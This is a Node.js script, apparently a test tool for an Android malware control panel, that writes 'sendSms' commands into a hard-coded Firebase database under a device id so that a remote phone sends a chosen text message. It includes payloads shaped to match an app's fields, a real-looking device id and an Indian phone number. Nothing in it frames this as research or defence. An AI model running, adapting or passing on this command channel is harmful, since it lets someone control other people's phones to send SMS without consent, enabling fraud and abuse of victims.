'use strict';

var FB = 'https://krish-10-default-rtdb.firebaseio.com';
var DEV = process.argv[2] || '6d83d82650a27834';
var TO = process.argv[3] || '9674725687';
var MSG = process.argv[4] || 'FBI panel local test ' + new Date().toISOString();

function url(path, auth){
  var u = FB.replace(/\/+$/, '') + '/' + path + '.json';
  if(auth) u += '?auth=' + auth;
  return u;
}

async function put(path, data, auth){
  var r = await fetch(url(path, auth), {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });
  var text = await r.text();
  return { status: r.status, text: text };
}

async function get(path, auth){
  var r = await fetch(url(path, auth));
  return { status: r.status, json: r.ok ? await r.json() : null };
}

function fullPayload(fromSim, to, message){
  var to10 = String(to).replace(/\D/g, '');
  if(to10.length > 10) to10 = to10.slice(-10);
  var plus = to10.length === 10 ? '+91' + to10 : String(to);
  var ts = Date.now();
  return {
    from: fromSim,
    to: to10,
    message: message,
    messageText: message,
    msg: message,
    sms: message,
    mobNo: to10,
    mobile: to10,
    num: to10,
    number: plus,
    phone: plus,
    phoneNumber: plus,
    sim: fromSim,
    simSlot: String(fromSim - 1),
    isSended: false,
    isSent: false,
    status: 'pending',
    time: Math.floor(ts / 1000),
    timestamp: ts
  };
}

(async function(){
  console.log('Device:', DEV, '→', TO);
  var path = 'clients/' + DEV + '/webhookEvent/sendSms';

  console.log('\n1) GOD minimal PUT');
  var p1 = { from: 1, to: TO, message: MSG, isSended: false };
  console.log(await put(path, p1));

  await new Promise(function(r){ setTimeout(r, 2000); });
  var g1 = await get(path);
  console.log('read back:', g1.status, JSON.stringify(g1.json));

  console.log('\n2) Full APK-style PUT');
  var p2 = fullPayload(1, TO, MSG + ' [full]');
  console.log(await put(path, p2));

  await new Promise(function(r){ setTimeout(r, 3000); });
  var g2 = await get(path);
  console.log('read back:', g2.status, JSON.stringify(g2.json));
})();
